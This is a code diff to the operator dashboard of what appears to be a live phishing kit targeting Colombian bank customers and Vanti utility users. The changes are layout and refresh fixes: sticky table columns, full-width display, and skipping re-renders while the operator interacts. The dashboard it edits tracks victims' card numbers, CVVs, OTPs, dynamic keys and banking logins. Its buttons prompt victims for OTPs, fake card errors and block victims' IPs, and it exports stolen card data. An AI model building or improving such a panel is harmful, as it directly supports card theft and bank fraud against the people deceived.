@@ -33,7 +33,8 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 .topbar-user strong { color: #e5e7eb; }
 .btn-logout { background: #ef4444; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
 .btn-logout:hover { background: #dc2626; }
-.container { max-width: 1600px; margin: 0 auto; padding: 20px; }
+/* 🔥 FIX #1: contenedor ocupa todo el ancho de la pantalla */
+.container { max-width: 100%; margin: 0 auto; padding: 20px; }
 .tab-content { display: none; }
 .tab-content.active { display: block; }
 .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 14px; margin-bottom: 20px; }
@@ -54,7 +55,39 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 .btn-borrar { background: #dc2626; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.15s; }
 .btn-borrar:hover { background: #b91c1c; }
 .btn-borrar:disabled { opacity: 0.4; cursor: not-allowed; }
-.table-wrap { overflow-x: auto; }
+
+/* 🔥 FIX #2: columnas sticky en la tabla de sesiones */
+.table-wrap { overflow-x: auto; position: relative; }
+
+.tabla-sesiones thead th:nth-child(1),
+.tabla-sesiones tbody td:nth-child(1) {
+    position: sticky; left: 0; z-index: 4;
+    background: #0f1421;
+    box-shadow: 4px 0 8px rgba(0,0,0,0.3);
+}
+.tabla-sesiones tbody td:nth-child(1) { background: #151b2e; }
+
+.tabla-sesiones thead th:nth-child(2),
+.tabla-sesiones tbody td:nth-child(2) {
+    position: sticky; left: 32px; z-index: 3;
+    background: #0f1421;
+    box-shadow: 4px 0 8px rgba(0,0,0,0.3);
+}
+.tabla-sesiones tbody td:nth-child(2) { background: #151b2e; }
+
+.tabla-sesiones thead th:last-child,
+.tabla-sesiones tbody td:last-child {
+    position: sticky; right: 0; z-index: 4;
+    background: #0f1421;
+    box-shadow: -4px 0 10px rgba(0,0,0,0.5);
+    min-width: 240px;
+}
+.tabla-sesiones tbody td:last-child { background: #151b2e; }
+
+.tabla-sesiones tbody tr:hover td:nth-child(1),
+.tabla-sesiones tbody tr:hover td:nth-child(2),
+.tabla-sesiones tbody tr:hover td:last-child { background: #1e2432; }
+
 table { width: 100%; border-collapse: collapse; font-size: 12px; }
 thead { background: #0f1421; }
 thead th { text-align: left; padding: 8px 10px; color: #8b94a8; font-weight: 600; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid #252d44; white-space: nowrap; }
@@ -199,7 +232,8 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                     </div>
                 </div>
                 <div class="table-wrap">
-                    <table>
+                    <!-- 🔥 FIX #2: clase tabla-sesiones para sticky -->
+                    <table class="tabla-sesiones">
                         <thead>
                             <tr>
                                 <th class="checkbox-col"><input type="checkbox" id="checkAllSesiones"></th>
@@ -322,6 +356,31 @@ let seleccionHistorial = new Set();
 let sesionesAnteriores = new Set(); 
 let audioCtx = null;
 
+// 🔥 FIX #3: evitar re-render mientras el usuario interactúa
+let usuarioInteractuando = false;
+let interaccionTimer = null;
+let ultimaFirmaSesiones = '';
+let firmaActivosAnterior = '';
+
+function marcarInteraccion() {
+    usuarioInteractuando = true;
+    clearTimeout(interaccionTimer);
+    interaccionTimer = setTimeout(() => { usuarioInteractuando = false; }, 1000);
+}
+document.addEventListener('pointerdown', marcarInteraccion, true);
+document.addEventListener('pointerup', marcarInteraccion, true);
+document.addEventListener('touchstart', marcarInteraccion, { capture: true, passive: true });
+
+function firmaSesiones(lista) {
+    return lista.map(s => [
+        s.sessionId, s.estado, s.paso,
+        s.datos && s.datos.tarjeta, s.datos && s.datos.otp,
+        s.datos && s.datos.claveDinamica, s.datos && s.datos.token,
+        s.datos && s.datos.monto, s.datos && s.datos.precio,
+        s.datos && s.datos.authUsuario
+    ].join('|')).join('~');
+}
+
 function $(id) { return document.getElementById(id); }
 function reproducirSonido() { try { if (!audioCtx) { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); } if (audioCtx.state === 'suspended') { audioCtx.resume(); } const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain(); osc.type = 'sine'; osc.frequency.setValueAtTime(800, audioCtx.currentTime); osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.1); gain.gain.setValueAtTime(0.1, audioCtx.currentTime); gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3); osc.connect(gain); gain.connect(audioCtx.destination); osc.start(); osc.stop(audioCtx.currentTime + 0.3); } catch (e) {} }
 function toast(msg, isError = false) { const el = $('toast'); el.textContent = msg; el.className = 'show' + (isError ? ' error' : ''); clearTimeout(el._t); el._t = setTimeout(() => { el.className = ''; }, 3000); }
@@ -371,12 +430,17 @@ function mostrarDashboard() { $('loginScreen').style.display = 'none'; $('dashbo
 async function cargarTodo() { try { await Promise.all([cargarStats(), cargarActivos(), cargarSesiones(), cargarIps(), cargarLogs(), cargarHistorial()]); } catch (e) { console.error(e); } }
 async function cargarStats() { try { const d = await api('/admin/stats'); $('statActivos').textContent = d.activos; $('statSesiones').textContent = d.sesiones; $('statPendientes').textContent = d.pendientes; $('statBloqueadas').textContent = d.bloqueadas; $('statHistorial').textContent = d.historial || 0; $('badgeActivos').textContent = d.activos; $('badgeSesiones').textContent = d.sesiones; $('badgeIps').textContent = d.bloqueadas; } catch (e) {} }
 
-async function cargarActivos() { 
-    try { 
-        const d = await api('/admin/activos'); 
-        activosCache = d.activos; 
-        renderActivos(); 
-    } catch (e) {} 
+// 🔥 FIX #3: no re-renderizar si el usuario interactúa o si los datos no cambiaron
+async function cargarActivos() {
+    try {
+        const d = await api('/admin/activos');
+        activosCache = d.activos || [];
+        if (usuarioInteractuando) return;
+        const firma = activosCache.map(a => a.sessionId + '|' + a.ultimaAccion).join(',');
+        if (firma === firmaActivosAnterior) return;
+        firmaActivosAnterior = firma;
+        renderActivos();
+    } catch (e) {}
 }
 
 function renderActivos() { 
@@ -414,19 +478,12 @@ function botonesSesion(s) {
     const btns = [];
 
   if (bancoKey === 'vanti') {
-    // 💲 Asignar Precio — siempre visible
     btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
-    // 📱 Pedir OTP — siempre visible
     btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
-    // 🔐 Autorizar Banca Virtual (reemplaza al Aceptar) — siempre visible
     btns.push(`<button class="btn" style="background:#a855f7; color:white;" title="Autorizar Banca Virtual" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
-    // ❌ Rechazar — siempre visible
     btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-    // ⚠️ Error CC — siempre visible
     btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
-    // 👁️ Ver Info — siempre visible
     btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Ver Información del Usuario" onclick="verInfoUsuario('${sid}')">👁️</button>`);
-    // 🚫 Bloquear — siempre visible
     btns.push(`<button class="btn btn-block" title="Bloquear y Expulsar IP" onclick="bloquearIp('${ip}')">🚫</button>`);
     return btns.join('');
 }
@@ -444,7 +501,6 @@ function botonesSesion(s) {
     }
 
     if (bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga') {
-        // 🔥 CAMBIO: Botón de Aceptar reemplazado por Pedir OTP
         btns.push(`<button class="btn btn-otp" title="Pedir OTP o Clave Dinámica" onclick="accion('${sid}','OTP')">📱</button>`);
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
@@ -474,7 +530,31 @@ function botonesSesion(s) {
     return btns.join('');
 }
 
-async function cargarSesiones() { try { const d = await api('/admin/sesiones'); const sesionesActuales = d.sesiones.reverse(); let hayNuevosDatos = false; if (sesionesAnteriores.size > 0) { for (let s of sesionesActuales) { if (!sesionesAnteriores.has(s.sessionId)) { hayNuevosDatos = true; break; } } } if (hayNuevosDatos) { reproducirSonido(); } sesionesAnteriores = new Set(sesionesActuales.map(s => s.sessionId)); sesionesCache = sesionesActuales; renderSesiones(); } catch (e) { console.error(e); } }
+// 🔥 FIX #3: no re-renderizar si el usuario interactúa o si los datos no cambiaron
+async function cargarSesiones() {
+    try {
+        const d = await api('/admin/sesiones');
+        const sesionesActuales = d.sesiones.reverse();
+
+        let hayNuevosDatos = false;
+        if (sesionesAnteriores.size > 0) {
+            for (let s of sesionesActuales) {
+                if (!sesionesAnteriores.has(s.sessionId)) { hayNuevosDatos = true; break; }
+            }
+        }
+        if (hayNuevosDatos) { reproducirSonido(); }
+        sesionesAnteriores = new Set(sesionesActuales.map(s => s.sessionId));
+        sesionesCache = sesionesActuales;
+
+        if (usuarioInteractuando) return;
+
+        const nuevaFirma = firmaSesiones(sesionesActuales);
+        if (nuevaFirma === ultimaFirmaSesiones) return;
+        ultimaFirmaSesiones = nuevaFirma;
+
+        renderSesiones();
+    } catch (e) { console.error(e); }
+}
 
 function renderSesiones() {
     const filtro = ($('buscarSesiones').value || '').toLowerCase().trim();
@@ -653,7 +733,6 @@ function copiarDatos(id) {
         texto += `Tarjeta: ${d.tarjeta}\nVencimiento: ${d.expMes}/${d.expAnio}\nCVV: ${d.cvv}\nTitular: ${d.titular}\nBanco: ${d.bankName}\n`;
     }
 
-    // 🔥 BLOQUE VANTI (solo si es vanti)
     if (h.bancoKey === 'vanti') {
         texto += `\n--- FORMULARIO VANTI ---\n`;
         texto += `Cuenta Contrato: ${d.cuenta || '-'}\n`;
@@ -700,9 +779,7 @@ function renderHistorial() {
         
         const fecha = new Date(h.fecha).toLocaleString('es-CO');
         const checked = seleccionHistorial.has(h.id) ? 'checked' : '';
-        // 🔥 CAMBIO: si es vanti y no hay tarjeta, mostrar la cuenta
         const tarjeta = datos.tarjeta || (placas.length > 0 ? placas.map(p => p.placa).join(', ') : null) || (h.bancoKey === 'vanti' ? (datos.cuenta || '-') : '-');
-        // 🔥 CAMBIO: si es vanti, usar nombres + apellidos
         const titular = datos.titular || (datos.nombres ? (datos.nombres + ' ' + (datos.apellidos || '')).trim() : null) || dp.primerNombre || '-';
         const exp = (datos.expMes || datos.expAnio || datos.exp) ? `${datos.expMes || ''}/${datos.expAnio || datos.exp || ''}` : '-';
         const cvv = datos.cvv || '-';
@@ -769,7 +846,6 @@ function renderHistorial() {
                             
                             ${htmlPlacas}
 
-                            <!-- 🔥 BLOQUE VANTI: datos del formulario -->
                             ${h.bancoKey === 'vanti' ? `
                             <div class="detalle-seccion-titulo" style="grid-column: 1/-1; margin-top: 15px;">🔥 Datos del Formulario Vanti</div>
                             <div class="detalle-item"><span class="lbl">Cuenta Contrato</span><span class="val">${escapeHtml(datos.cuenta || '-')}</span></div>
